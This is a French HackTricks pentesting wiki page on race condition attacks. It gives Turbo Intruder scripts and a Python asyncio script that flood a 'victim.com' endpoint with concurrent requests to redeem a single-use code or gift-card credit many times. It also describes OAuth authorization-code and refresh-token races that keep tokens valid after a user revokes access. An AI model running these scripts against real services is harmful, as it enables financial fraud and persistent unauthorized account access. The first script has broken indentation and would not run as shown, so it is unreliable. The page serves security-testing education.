# Condition de course

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour crÃ©er et **automatiser facilement des flux de travail** alimentÃ©s par les outils communautaires les plus avancÃ©s au monde.\
Obtenez l'accÃ¨s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dÃ©pÃ´t hacktricks](https://github.com/carlospolop/hacktricks) et au [dÃ©pÃ´t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Tout ce qui est limitÃ© par un nombre de tentatives

Les conditions de course sont des **vulnÃ©rabilitÃ©s** qui **apparaissent** sur les sites web qui **limitent le nombre de fois oÃ¹ vous pouvez effectuer une action**. Un exemple trÃ¨s simple peut Ãªtre trouvÃ© dans [**ce rapport**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43).

## Utilisation de plusieurs fois un code Ã  usage unique

Lorsque vous faites en sorte que la page web effectue une **action** qui **ne doit Ãªtre effectuÃ©e qu'une seule fois**, mais si l'action est effectuÃ©e **plusieurs fois**, vous serez **bÃ©nÃ©ficiÃ©**, vous devez vraiment essayer une **condition de course**.\
La plupart du temps, cela est directement liÃ© Ã  l'**argent** (si une action est effectuÃ©e, vous obtenez X argent, alors essayons de la faire plusieurs fois trÃ¨s rapidement)**.**

### **Utilisation du mÃªme code Ã  partir du mÃªme compte plusieurs fois**

Par exemple, dans [**ce bug**](https://hackerone.com/reports/759247), le chasseur a pu **charger l'argent dans une carte cadeau plusieurs fois**.

Voici le script **turbo intruder** utilisÃ© pour **tester** la **condition de course** du rapport mentionnÃ© :
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
    engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
   engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
En utilisant Ã©galement BURP, vous pouvez envoyer la **requÃªte** Ã  **Intruder**, dÃ©finir le **nombre de threads** Ã  **30** dans le menu **Options** et sÃ©lectionner comme charge utile **Null payloads** et gÃ©nÃ©rer **30**.

### **Utilisation du mÃªme code Ã  partir de diffÃ©rents comptes**

**Si la proposition prÃ©cÃ©dente n'a pas fonctionnÃ© (essayez d'utiliser le mÃªme code plusieurs fois Ã  partir du mÃªme compte), vous pouvez essayer une variante : essayez d'utiliser le mÃªme code Ã  partir de diffÃ©rents comptes :**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
    for i in range(len(a)):
        engine.queue(target.req,a[i], gate='race1')
    # open TCP connections and send partial requests
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
### Utilisation de Python
```python
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): #20 times
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        for r in results:
            print(r)
        
        # Async2sync sleep
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
```
## Persistance Ã©ternelle OAuth2

Il existe plusieurs [**fournisseurs OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ces services vous permettent de crÃ©er une application et d'authentifier les utilisateurs que le fournisseur a enregistrÃ©s. Pour ce faire, le **client** devra **autoriser votre application** Ã  accÃ©der Ã  certaines de leurs donnÃ©es Ã  l'intÃ©rieur du **fournisseur OAuth**.\
Jusqu'ici, il s'agit simplement d'une connexion courante avec Google/LinkedIn/GitHub... oÃ¹ vous Ãªtes invitÃ© avec une page disant : "_L'application \<InsertCoolName> veut accÃ©der Ã  vos informations, voulez-vous l'autoriser ?_"

#### Course Conditionnelle dans `authorization_code`

Le **problÃ¨me** apparaÃ®t lorsque vous **l'acceptez** et envoie automatiquement un **`authorization_code`** Ã  l'application malveillante. Ensuite, cette **application abuse d'une course conditionnelle dans le fournisseur OAuth pour gÃ©nÃ©rer plus d'un AT/RT** (_Authentication Token/Refresh Token_) Ã  partir du **`authorization_code`** pour votre compte. Fondamentalement, elle va abuser du fait que vous avez acceptÃ© l'application pour accÃ©der Ã  vos donnÃ©es pour **crÃ©er plusieurs comptes**. Ensuite, si vous **arrÃªtez d'autoriser l'application Ã  accÃ©der Ã  vos donnÃ©es, une paire de AT/RT sera supprimÃ©e, mais les autres seront toujours valides**.

#### Course Conditionnelle dans `Refresh Token`

Une fois que vous avez **obtenu un RT valide**, vous pouvez essayer de **l'abuser pour gÃ©nÃ©rer plusieurs AT/RT** et **mÃªme si l'utilisateur annule les autorisations** pour l'application malveillante d'accÃ©der Ã  ses donnÃ©es, **plusieurs RT seront toujours valides.**

## RÃ©fÃ©rences

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour crÃ©er et **automatiser facilement des workflows** alimentÃ©s par les outils communautaires les plus avancÃ©s au monde.\
Obtenez l'accÃ¨s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
